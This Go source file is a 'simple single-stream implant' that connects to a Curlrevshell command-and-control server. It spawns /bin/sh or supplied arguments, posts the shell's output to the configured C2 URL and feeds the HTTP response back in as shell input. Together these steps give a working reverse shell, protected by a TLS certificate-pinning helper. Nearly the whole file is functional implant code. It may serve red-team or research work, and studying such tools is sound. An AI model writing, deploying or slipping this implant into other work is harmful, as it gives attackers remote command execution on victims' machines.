// Package simpleshell is a no-frills shell which connects to Curlrevshell.
package simpleshell

/*
 * simpleshell.go
 * Simple single-stream implant
 * By J. Stuart McMurray
 * Created 20241003
 * Last Modified 20241013
 */

import (
	"context"
	"crypto/sha256"
	"crypto/subtle"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"errors"
	"fmt"
	"net/http"
	"os/exec"
	"strings"
)

const (
	// IOPath is the path on Curlrevshell to which we'll connect.
	IOPath = "/io"
	// DefaultShell is the path to the shell used if [GoSimple] is
	// called with no args.
	DefaultShell = "/bin/sh"
)

// ErrNoMatchingCertificate indicates a TLS connection's peer did not present
// a certificate matching a configured fingerprint.
var ErrNoMatchingCertificate = errors.New(
	"no certificate with correct fingerprint found",
)

// ConnConfig describes a connection between a Shell and Curlrevshell.
type ConnConfig struct {
	// C2 is where we find curlrevshell.  Its path should normaly be
	// IOPath.
	C2 string

	// Fingerprint is the Base64-encoded SHA256 hash of the server's TLS
	// certificate, as normally passed to curl --pinnedpubkey.  The
	// leading sha256// is optional.
	Fingerprint string
}

// GoSimple is the simplest way to run a shell.  It wraps [CmdShell],
// [ConnConfig], and [Go].  If args is empty or nil, []string{DefaultShell}
// will be used.
func GoSimple(ctx context.Context, c2, fingerprint string, args []string) error {
	/* Work out our shell. */
	if 0 == len(args) {
		args = []string{DefaultShell}
	}
	shell, err := NewCmdShell(exec.Command(args[0], args[1:]...))
	if nil != err {
		return fmt.Errorf("preparing subprocess: %w", err)
	}

	/* Do it! */
	return Go(ctx, ConnConfig{C2: c2, Fingerprint: fingerprint}, shell)
}

// Go connects a Shell to Curlrevshell.
func Go(ctx context.Context, conf ConnConfig, shell Shell) error {
	/* Roll an HTTP client. */
	client := http.DefaultClient
	/* Add fingerprint verification if we have it. */
	if "" != conf.Fingerprint {
		vfp, err := TLSFingerprintVerifier(conf.Fingerprint)
		if nil != err {
			return fmt.Errorf(
				"setting up TLS fingerprint verification: %w",
				err,
			)
		}
		transport := http.DefaultTransport.(*http.Transport).Clone()
		transport.TLSClientConfig = &tls.Config{
			InsecureSkipVerify: true,
			VerifyConnection:   vfp,
		}
		transport.ForceAttemptHTTP2 = true
		client.Transport = transport
	}

	/* Connect to CRS. */
	res, err := client.Post(conf.C2, "", shell.Output())
	if nil != err {
		return fmt.Errorf("connecting to %s: %w", conf.C2, err)
	}

	/* Do shell things. */
	shell.SetInput(res.Body)
	if err := shell.Go(ctx); nil != err {
		return fmt.Errorf("running %s: %w", shell, err)
	}

	return nil
}

// TLSFingerprintVerifier returns a function which can be used for
// [tls.Config.VerifyConnection].  It ensures the peer presents a certificate
// with the given fingerprint, which must be a base64-encoded sha256 hash as
// used by curl, with or without the leading sha256//.
func TLSFingerprintVerifier(fp string) (
	func(tls.ConnectionState) error,
	error,
) {
	/* Make sure the fingerprint looks correct. */
	wantFP, err := base64.StdEncoding.DecodeString(
		strings.TrimPrefix(fp, "sha256//"),
	)
	if nil != err {
		return nil, fmt.Errorf("decoding fingerprint: %w", err)
	}
	if 32 != len(wantFP) {
		return nil, fmt.Errorf("decoded fingerprint not 32 bytes")
	}

	/* Return a function to check if any of the certs in
	cs.PeerCertificates have the right hash. */
	return func(cs tls.ConnectionState) error {
		/* Check ALL the certs. */
		for i, cert := range cs.PeerCertificates {
			/* Hash the cert. */
			b, err := x509.MarshalPKIXPublicKey(cert.PublicKey)
			if nil != err {
				return fmt.Errorf(
					"marshalling peer certificate "+
						"%d/%d to DER: %w",
					i+1, len(cs.PeerCertificates),
					err,
				)
			}
			h := sha256.Sum256(b)

			/* See if it matches. */
			if 1 == subtle.ConstantTimeCompare(wantFP, h[:]) {
				return nil
			}
		}
		return ErrNoMatchingCertificate
	}, nil
}

// SplitArgs splits s into a slice of strings using the first rune in s as the
// separator.  Runs of empty elements are not compressed.
func SplitArgs(s string) []string {
	/* Empty strings ar easy. */
	if 0 == len(s) {
		return []string{}
	}
	/* Split off the first rune. */
	rs := []rune(s)
	if 0 == len(rs) {
		return []string{}
	}
	sep := rs[0]
	rs = rs[1:]
	/* Split on the first rune. */
	if 0 == len(rs) {
		return []string{}
	}
	return strings.Split(string(rs), string(sep))
}
